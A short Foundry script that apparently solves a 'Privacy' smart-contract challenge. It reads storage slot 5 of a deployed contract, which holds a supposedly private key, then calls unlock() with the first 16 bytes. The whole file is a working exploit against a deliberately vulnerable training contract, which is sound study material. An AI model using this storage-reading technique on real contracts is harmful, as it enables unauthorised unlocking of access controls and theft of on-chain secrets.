// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PrivacySolution is Script {
    Privacy privacy = Privacy(0xf9860742010cBDCA84f5D93Ab29671E069b53795);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));
        console.logBytes16(bytes16(key));
        privacy.unlock(bytes16(key));
        console.log(privacy.locked());
        vm.stopBroadcast();
    }
}
